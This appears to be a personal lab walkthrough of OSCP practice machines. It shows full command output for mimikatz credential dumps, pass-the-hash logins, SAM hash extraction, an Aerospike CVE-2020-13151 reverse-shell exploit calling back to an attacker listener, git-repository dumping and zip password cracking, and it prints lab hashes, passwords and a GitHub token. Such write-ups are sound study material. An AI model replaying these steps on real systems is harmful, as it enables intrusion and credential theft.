cur/text: 69jHwjGN2bPQFvJ

Secret  : _SC_wampmariadb64 / service 'wampmariadb64' with username : .\Mary.Williams
cur/text: 69jHwjGN2bPQFvJ

Secret  : _SC_wampmysqld64 / service 'wampmysqld64' with username : .\Mary.Williams
cur/text: 69jHwjGN2bPQFvJ

mimikatz # dpapi::cache

CREDENTIALS cache
=================
SID:S-1-5-21-2610934713-1581164095-2706428072-1105;;MD4:e728ecbadfb02f51ce8eed753f3ff3fd;SHA1:8cb61017910862af238631bf7aaae38df64998cd;
SID:S-1-5-21-2114389728-3978811169-1968162427-1002;;MD4:9a3121977ee93af56ebd0ef4f527a35e;SHA1:4b1beca6645e6c3edb991248bcd992ec2a90fbb5;

MASTERKEYS cache
================

DOMAINKEYS cache
================

mimikatz # 

```

# MS01 To DC01 10.10.168.140

Found the `celia.almeda : e728ecbadfb02f51ce8eed753f3ff3fd` and base on that to go the 10.10.168.140

![Pasted image 20251215155631.png](/ob/Pasted%20image%2020251215155631.png)

```shell
┌──(root㉿kali)-[~/Desktop]
└─# netexec winrm  10.10.168.141/24 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd' 
WINRM       10.10.168.142   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
WINRM       10.10.168.140   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
WINRM       10.10.168.141   5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.168.142   5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.168.140   5985   DC01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.10.168.141   5985   MS01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
                                                                                                                                                                                                                
┌──(root㉿kali)-[~/Desktop]
└─# 
```

```shell
┌──(root㉿kali)-[~/Desktop]
└─#  evil-winrm -i 10.10.168.142 -u 'celia.almeda' -H 'e728ecbadfb02f51ce8eed753f3ff3fd'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\celia.almeda\Documents> 

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-windows-Files" >}} Discovering windows.old file which contain sensitive data ,like SAM , SYSTEM ,then using the secretsdump.py to get the admin 's hash , then using the evil-winrm to arrive admin folder

{{< /toggle >}}

{{< mindmap >}}

# windows.old

* SAM
* SYSTEM

# secretsdump.py

* hash
  * evil-winrm

{{< /mindmap >}}

Discovering the `windows.old` and contain the SAM,SYSTEM, also reference [to](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)\
![Pasted image 20251215160528.png](/ob/Pasted%20image%2020251215160528.png)

![Pasted image 20251215162722.png](/ob/Pasted%20image%2020251215162722.png)

```
└─# secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
                                                                                                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop]
└─# 
```

Found the hashes with secretsdump.py  ,so user the evil-winrm  to arrive tom\_admin 's admin foler.

```
evil-winrm -i 10.10.100.140  -u 'tom_admin' -H '4979d69d4ca66955c075c41cf45f24dc'
```

***

# Recon 192.168.X.143

```shell
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.X.143 -oN serviceScan.txt
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 23:4c:6f:ff:b8:52:29:65:3d:d1:4e:38:eb:fe:01:c1 (RSA)
|   256 0d:fd:36:d8:05:69:83:ef:ae:a0:fe:4b:82:03:32:ed (ECDSA)
|_  256 cc:76:17:1e:8e:c5:57:b2:1f:45:28:09:05:5a:eb:39 (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Test Page for the Nginx HTTP Server on Fedora
443/tcp  open  http       Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3003-TCP:V=7.95%I=7%D=12/16%Time=6940C167%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPRe
SF:quest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCo
SF:okie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString
SF:,1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### 3003 TCP

{{< toggle "Tag 🏷️" >}}

{{< tag "CVE-2020-13151" >}} Discovering Aerospike Community Edition 5.1 in port 3003 cgms which  can be exploited by CVE-2020-13151 to have the RCE

{{< /toggle >}}

```
└─# nc -nv 192.168.217.143 3003
(UNKNOWN) [192.168.217.143] 3003 (?) open
help
<del>- [ ] bins;build;build_os;build_time;cluster-name;config-get;config-set;digests;dump-cluster;dump-fabric;dump-hb;dump-hlc;dump-migrates;dump-msgs;dump-rw;dump-si;dump-skew;dump-wb-summary;eviction-reset;feature-key;get-config;get-sl;health-outliers;health-stats;histogram;jem-stats;jobs;latencies;log;log-set;log-message;logs;mcast;mesh;name;namespace;namespaces;node;physical-devices;quiesce;quiesce-undo;racks;recluster;revive;roster;roster-set;service;services;services-alumni;services-alumni-reset;set-config;set-log;sets;show-devices;sindex;sindex-create;sindex-delete;sindex-histogram;statistics;status;tip;tip-clear;truncate;truncate-namespace;truncate-namespace-undo;truncate-undo;version;</del>
version 
```

![Pasted image 20260109150533.png](/ob/Pasted%20image%2020260109150533.png)

```
└─# sudo nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.228.143] 48028
/bin/sh: 0: can't access tty; job control turned off
$ 

└─# uv run cve2020-13151.py --ahost 192.168.228.143  --pythonshell --lhost=192.168.45.193  --lport=80
[+] aerospike build info: 5.1.0.1

[+] looks vulnerable
[+] populating dummy table.
[+] writing to test.cve202013151
[+] wrote JmArSQGQLiXfCFlA
[+] registering udf


```

![Pasted image 20260109152811.png](/ob/Pasted%20image%2020260109152811.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-link-Injection" >}} Discovering /usr/bin/asinfo pspy64 (own by root ) which is linked to /opt/aerospike/bin/asinfo(own by us) by pspy64, then inject revshell to have the root .

{{< /toggle >}}\
{{< mindmap >}}

# pspy64

* /usr/bin/asinfo
  * opt/aerospike/bin/asinfo
    * inject into opt/aerospike/bin/asinfo
      * root\
        {{< /mindmap >}}

```
$ chmod +x pspy64
$ timeout  120 ./pspy64  -pf -i 1000
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done                                                                                                                                                                                                
2026/01/09 07:34:37 CMD: UID=1000  PID=7115   | ./pspy64 -pf -i 1000                                                                                                                                
2026/01/09 07:34:37 CMD: UID=1000  PID=7114   | timeout 120 ./pspy64 -pf -i 1000                                                                                                                    
2026/01/09 07:34:37 CMD: UID=1000  PID=6795   | /bin/sh -i                                 
```

it appear every 10 sec , so we may use it\
![Pasted image 20260109153903.png](/ob/Pasted%20image%2020260109153903.png)

```
aero@oscp:/tmp$ ls -al /usr/bin/asinfo
lrwxrwxrwx 1 root root 25 Dec  7  2019 /usr/bin/asinfo -> /opt/aerospike/bin/asinfo
aero@oscp:/tmp$ ls -al /opt/aerospike/bin/asinfo
-rwxr-xr-x 1 aero aero 12855 Dec  7  2019 /opt/aerospike/bin/asinfo
aero@oscp:/tmp$ whoami
aero
```

# Recon 192.168.X.144

### Nmap

```
Not shown: 65517 closed tcp ports (reset)
PORT      STATE    SERVICE       REASON
21/tcp    open     ftp           syn-ack ttl 61
22/tcp    open     ssh           syn-ack ttl 61
80/tcp    open     http          syn-ack ttl 61
2798/tcp  filtered tmesis-upshot no-response
2916/tcp  filtered elvin_server  no-response
6524/tcp  filtered unknown       no-response
12242/tcp filtered unknown       no-response
12307/tcp filtered unknown       no-response
20141/tcp filtered unknown       no-response
31977/tcp filtered unknown       no-response
40561/tcp filtered unknown       no-response
41472/tcp filtered unknown       no-response
41552/tcp filtered unknown       no-response
54453/tcp filtered unknown       no-response
59164/tcp filtered unknown       no-response
59521/tcp filtered unknown       no-response
60819/tcp filtered unknown       no-response
62417/tcp filtered unknown       no-response

-------

└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.136.144 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 23:17 +0800
Nmap scan report for 192.168.136.144
Host is up (0.053s latency).

PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           vsftpd 3.0.5
22/tcp    open   ssh           OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
80/tcp    open   http          Apache httpd 2.4.52 ((Ubuntu))
|_http-generator: Nicepage 4.21.12, nicepage.com
| http-git: 
|   192.168.136.144:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: Security Update 
|     Remotes:
|_      https://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@github.com/PWK-Challenge-Lab/dev.git
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
2798/tcp  closed tmesis-upshot
2916/tcp  closed elvin_server
6524/tcp  closed unknown
12242/tcp closed unknown
12307/tcp closed unknown
20141/tcp closed unknown
31977/tcp closed unknown
40561/tcp closed unknown
41472/tcp closed unknown
41552/tcp closed unknown
54453/tcp closed unknown
59164/tcp closed unknown
59521/tcp closed unknown
60819/tcp closed unknown
62417/tcp closed unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
                                                                                                    
```

***

{{< toggle "Tag 🏷️" >}}

{{< tag "web-github-abuse" >}} Discovering the /.git/ in website by nmap ,then, abusing git to find database.php which contain password to login by ssh

{{< /toggle >}}

{{< mindmap >}}

# nmap

* git
  * database.php
    * password
      * ssh\
        {{< /mindmap >}}

### git recon

```
─# uv pip install git-dumper 
Using Python 3.13.11 environment at: haydon_env
Resolved 15 packages in 816ms
Prepared 7 packages in 3.05s
Installed 12 packages in 52ms
 + beautifulsoup4==4.14.3
 + cffi==2.0.0
 + charset-normalizer==3.4.4
 + cryptography==46.0.3
 + dulwich==0.25.2
 + git-dumper==1.0.8
 + pycparser==2.23
 + pysocks==1.7.1
 + requests==2.32.5
 + requests-pkcs12==1.27
 + soupsieve==2.8.1
 + urllib3==2.6.3                                        
```

```
└─# uv run git-dumper http://192.168.136.144/.git/ .       
[-] Testing http://192.168.136.144/.git/HEAD [200]
[-] Testing http://192.168.136.144/.git/ [200]
...snip...
```

### git abuse

```
git log
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:56:19 2022 +0200

    Delete database.php

commit eda55ed6455d29532295684e3900cda74d695067
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:40 2022 +0200

    Create robots.txt

commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:27:08 2022 +0200

    Create search.php

commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 17:26:09 2022 +0200

    Setting up database.php

```

![Pasted image 20260114232631.png](/ob/Pasted%20image%2020260114232631.png)

got the account stuart@challenge.lab : BreakingBad92

```shell
─#     git show 621a2e79b3a4a08bba12effe6331ff4513bad91a
commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
Date:   Fri Nov 18 23:57:12 2022 +0200

    Create database.php

diff --git a/configuration/database.php b/configuration/database.php
new file mode 100644
index 0000000..55b1645
--- /dev/null
+++ b/configuration/database.php
@@ -0,0 +1,19 @@
+<?php
+class Database{
+    private $host = "localhost";
+    private $db_name = "staff";
+    private $username = "stuart@challenge.lab";
+    private $password = "BreakingBad92";
+    public $conn;
+    public function getConnection() {
+        $this->conn = null;
+        try{
+            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+            $this->conn->exec("set names utf8");
+        }catch(PDOException $exception){
+            echo "Connection error: " . $exception->getMessage();
+        }
+        return $this->conn;
+    }
+}
+?>

```

### SSH 22

```
└─#  ssh stuart@192.168.136.144 
The authenticity of host '192.168.136.144 (192.168.136.144)' can't be established.
ED25519 key fingerprint is: SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.136.144' (ED25519) to the list of known hosts.
stuart@192.168.136.144's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 14 03:32:39 PM UTC 2026

  System load:  0.0                Processes:               203
  Usage of /:   40.4% of 18.53GB   Users logged in:         0
  Memory usage: 11%                IPv4 address for ens160: 192.168.136.144
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
stuart@oscp:~$ 

```

### stuart to chloe(backup file cred leak)

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-backupfile" >}} Discovering zip backup file zip ,using zip2john to get the backup file password, configuration.php of joomla contain the chloe's password

{{< /toggle >}}

![Pasted image 20260114234116.png](/ob/Pasted%20image%2020260114234116.png)

```
stuart@oscp:/opt/backup$ ls
sitebackup1.zip  sitebackup2.zip  sitebackup3.zip
stuart@oscp:/opt/backup$ 
```

```
└─# scp -v stuart@192.168.136.144:/opt/backup/sitebackup*.zip ./
Executing: program /usr/bin/ssh host 192.168.136.144, user stuart, command sftp
debug1: OpenSSH_10.2p1 Debian-3, OpenSSL 3.5.4 30 Sep 2025
```

```
──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
└─# file sitebackup1.zip
file sitebackup2.zip
file sitebackup3.zip
sitebackup1.zip: empty
sitebackup2.zip: data
sitebackup3.zip: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Nov 17 2022 10:39:20, uncompressed size 0, method=store                   
```

```
└─# zip2john sitebackup3.zip >hash3
ver 2.0 sitebackup3.zip/joomla/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/administrator/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/api/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cache/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/cli/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/components/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/images/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/includes/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/language/overrides/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/layouts/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/libs/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/media/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/modules/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/plugins/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/templates/ is not encrypted, or stored with non-handled compression type
ver 2.0 sitebackup3.zip/joomla/tmp/ is not encrypted, or stored with non-handled compression type
                                                                                                                                                                                                                                            
┌──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
└─# cat hash3 
sitebackup3.zip/joomla/.DS_Store:$zip2$*0*1*0*17fc672f1505f7f7*6a80*446*f1bd10a274d16115fa4ca1725440b59c614b82d000b9656892c7bd10b5f4e33db059a55965df05fccde96e1da40d901d0dff75070b0d9cce76a0e63edab003bfc4ea81f3402de3bcdbdf35c3859510b945a27336b2bfe2a726f4bc58c745a58e14491ca2b84fe1b9a90738f3f560a8e4d876e97e29236f3205ecbae4af101cf8aa522e673cf7a2c25e5b9ad69c21a3d821542245c4794df889e0c8d10ec013f1b64007968f4e7638d1f8502c0092b5324322ba36979a4a60574230a9ede6289863d108971bce84225e04ebaf00fe85b4809ff6f8dc8c6f55fb854f8adabffe6e5707196356568b21cb6cfd3daae69cc293705aaf41aecb9a5d47f7b5556e07e12edf6838cbb8d2144e16024de1f867b06837ef40d45108a9cffbf9e797a31d56b35d86e28375329a6faa0e6f2716cbff58c3c717329a815e7d30328b749e6c995bb2b549b00f3cb4f4e01a53346db64da34e40e3a9bf4ce8bbcbe920f72a40a8b4542e96d635356be01980ece7f1cbdeda02392bdce4363dce2f3679387c52bec8afbaabee436c9ece27cf0992ee8edbe3849a3b7542bb8bafedaef873d8c8f2f039760ad04a044b678d8ff0936f742751dc6b7477d1b3b3b5dfa094cdbfb688cd8be50c031c15df708e5f7c5fc58b602d17f8412322e4a2083ae2e53d9753d59eb5791705417d49d850a1130ebbc85f66cc2ba2249cf9b741176d99a63f03fdb1df0e39d6f5911854bcb7715fff57623d973902d52532936de271c2c2319804a7b76753e68ef2a5f088e8fa90ed0d0ddbb0d607a328dbf44a715371a98d0e668b71c3476c1db89d8f4c85cf4104155487fd3c24ae7a95a0fb24a1d5d20935086872bceb3de44ae37c4fa857daeee36f0f7b5f7ebdb679d5652bbdcfa72c5bcd4143a503ca0017602476af5362e3ecf4da6e6103521141b0a860fd6427441ec2f86b57c1a20017d4f4794d21947e169a9c1806a0a201e0f598f7bd05ccc3b5e51d68760bfc41b1edce23f79f29d9200cd0ec9ae917292451f04399691cefef6e6464dd7adcb2e06a1fc81f643ce809264147dca4c3feba46b29a02a677c4b303367f216febd7b1e592fb00dbbc9c0251da34479361c29aecc7c2b01c9a84c39fd9f4887406a33087fc2bcdf6af5cd8ec6f843f2bf96970b117e823187021d3aba71b05b25b01da2e42c52d38180c34e3a5f21a59aa92bf4e98f3a1e0abbf94520203e6daa411e1076dd0d8253b42b9936ee35b87d8fa76a3ed7c1fda7801ff9b6ec8bdb532a6fb0bc659201a631551ee5faa4d8f636a02dd4e77805ed87447d2707381bff4df09eeeca873ff2d798b50a1d39873c5de6b9c9cce0d06b262c4094b47a96fefabd22c90504d14245b46d7f8a4ca32f73bd5c08ba5bf0bca712137b816a45dbe21b6533e0c53ff65c44a61d88be8bf0f688ff4c3423f96c4b55f888967a71fc70b85beaa2ee3e2a03e6bb6ccbd31e53dd3054ab1c24dc72cfa4d6550c7861e0797eedca1016ba
```

```
# john --wordlist=/usr/share/wordlists/rockyou.txt  hash3 
Using default input encoding: UTF-8
Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 0.14% (ETA: 00:47:23) 0g/s 0p/s 178951c/s 178951C/s 123456..280789
codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/app.php)     
codeblue         (sitebackup3.zip/joomla/web.config.txt)     
codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
codeblue         (sitebackup3.zip/joomla/cli/index.html)     
codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
codeblue         (sitebackup3.zip/joomla/includes/index.html)     
codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
codeblue         (sitebackup3.zip/joomla/cache/index.html)     
codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
codeblue         (sitebackup3.zip/joomla/README.txt)     
codeblue         (sitebackup3.zip/joomla/language/index.html)     
codeblue         (sitebackup3.zip/joomla/.DS_Store)     
codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
codeblue         (sitebackup3.zip/joomla/index.php)     
codeblue         (sitebackup3.zip/joomla/configuration.php)     
codeblue         (sitebackup3.zip/joomla/robots.txt)     
codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
19g 0:00:00:05 DONE (2026-01-15 00:24) 3.578g/s 9256p/s 175873c/s 175873C/s 280690..trudy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

use the 7z with the password to decode the zip file

```
sudo apt install p7zip-full
Ign:1 http://security.kali.org/kali-security kali/updates InRelease
0% [Connecting to http.kali.org (54.39.128.230)] [Connecting to dl.google.com] [Connecting to download.sublimetext.
Get:2 https://dl.google.com/linux/chrome/deb stable InRelease [1,825 B]                                            
Get:3 https://dl.google.com/linux/chrome/deb stable/main amd64 Packages [1,214 B]                                  
Get:4 http://mirror.twds.com.tw/kali kali-rolling InRelease [34.0 kB]                                             
Get:5 https://download.sublimetext.com apt/stable/ InRelease [3,320 B]
Get:6 http://mirror.twds.com.tw/kali kali-rolling/main amd64 Packages [20.9 MB]
Ign:1 http://security.kali.org/kali-security kali/updates InRelease
Ign:1 http://security.kali.org/kali-security kali/updates InRelease
Get:7 http://mirror.twds.com.tw/kali kali-rolling/main amd64 Contents (deb) [52.5 MB]
Err:1 http://security.kali.org/kali-security kali/updates InRelease                                                
  Something wicked happened resolving 'security.kali.org:http' (-5 - No address associated with hostname)
Get:8 http://mirror.twds.com.tw/kali kali-rolling/non-free amd64 Packages [190 kB]                                 
Get:9 http://mirror.twds.com.tw/kali kali-rolling/non-free amd64 Contents (deb) [905 kB]                           
Get:10 http://mirror.twds.com.tw/kali kali-rolling/contrib amd64 Packages [115 kB]                                 
Get:11 http://mirror.twds.com.tw/kali kali-rolling/contrib amd64 Contents (deb) [254 kB]                           
Fetched 74.8 MB in 11s (6,508 kB/s)                                                                                
367 packages can be upgraded. Run 'apt list --upgradable' to see them.
Warning: Failed to fetch http://security.kali.org/kali-security/dists/kali/updates/InRelease  Something wicked happened resolving 'security.kali.org:http' (-5 - No address associated with hostname)
Warning: Some index files failed to download. They have been ignored, or old ones used instead.
Note, selecting '7zip' instead of 'p7zip-full'
7zip is already the newest version (25.01+dfsg-5).
7zip set to manually installed.
Summary:                    
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 367
                                                                                                                    
┌──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
└─# 7z x sitebackup3.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_HK.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 25312 bytes (25 KiB)

Extracting archive: sitebackup3.zip
--
Path = sitebackup3.zip
Type = zip
Physical Size = 25312

    
Enter password (will not be echoed):
Everything is Ok

Folders: 17
Files: 19
Size:       67063
Compressed: 25312

```

```
ls /joomla/configuration.php
```

![Pasted image 20260115004012.png](/ob/Pasted%20image%2020260115004012.png)

```
stuart@oscp:/opt/backup$ su chloe
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

chloe@oscp:/opt/backup$ su root

```

### chloe to root

![Pasted image 20260115004217.png](/ob/Pasted%20image%2020260115004217.png)

![Pasted image 20260115004340.png](/ob/Pasted%20image%2020260115004340.png)
